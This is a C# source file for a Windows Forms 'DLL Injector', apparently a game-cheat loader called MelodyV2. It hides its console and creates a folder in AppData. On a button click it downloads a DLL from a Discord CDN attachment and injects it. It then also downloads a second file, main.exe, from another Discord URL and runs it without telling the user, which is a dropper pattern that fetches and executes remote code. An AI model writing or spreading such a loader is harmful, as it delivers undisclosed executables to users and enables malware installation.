using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;

class Program
{
    public static DirectoryInfo config;

    [STAThread]
    static void Main(string[] args)
    {
        // Hide the console window
        IntPtr hWnd = NativeMethods.GetConsoleWindow();
        NativeMethods.ShowWindow(hWnd, NativeMethods.SW_HIDE);

        Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".melody"));
        config = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".melody"));

        // Start the message loop
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);

        Application.Run(new InjectorApplicationContext());
    }

    // Define your Windows Form application context here
    class InjectorApplicationContext : ApplicationContext
    {
        private InjectorForm injectorForm;

        public InjectorApplicationContext()
        {
            injectorForm = new InjectorForm();
            injectorForm.InjectButtonClicked += InjectorForm_InjectButtonClicked;
            injectorForm.Show();
        }

        private void InjectorForm_InjectButtonClicked(object sender, EventArgs e)
        {
            try
            {
                InjectDLL();

                MessageBox.Show("DLL injected successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        static void InjectDLL()
        {
            string dllPath = Path.Combine(config.FullName, "MelodyV2.dll");

            // Download DLL from the provided URL
            string downloadUrl = "https://cdn.discordapp.com/attachments/1131979935691579485/1230394276152873010/MelodyV2.dll?ex=663328f7&is=6620b3f7&hm=c8b530d009a56139917884fb058741d4c1aaba18b3b921bf4703167b2f8aae1b&";
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(downloadUrl, dllPath);
            }

            if (File.Exists(dllPath))
            {
                InjectionHandler.InjectDLL(dllPath);
                MessageBox.Show("DLL injected successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                throw new FileNotFoundException("DLL file not found: " + dllPath);
            }

            // Download main.exe and start the process
            string exePath = Path.Combine(config.FullName, "main.exe");
            downloadUrl = "https://cdn.discordapp.com/attachments/1163924542129971293/1226315030258123002/main.exe?ex=662451df&is=6611dcdf&hm=d87284901335f9ac026b0e52ff8cc8b2e2e203141a6aa70ce640b071a7f18ae9&";
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(downloadUrl, exePath);
            }

            if (File.Exists(exePath))
            {
                Process.Start(exePath);
            }
            else
            {
                throw new FileNotFoundException("main.exe not found: " + exePath);
            }
        }
    }

    // Define your Windows Form here
    class InjectorForm : Form
    {
        public event EventHandler InjectButtonClicked;

        public InjectorForm()
        {
            Text = "DLL Injector";

            Button injectButton = new Button();
            injectButton.Text = "Inject DLL";
            injectButton.Dock = DockStyle.Fill;
            injectButton.Click += (sender, e) => InjectButtonClicked?.Invoke(sender, e);

            Controls.Add(injectButton);
        }
    }

    // P/Invoke declarations for hiding the console window
    internal static class NativeMethods
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
    }
}
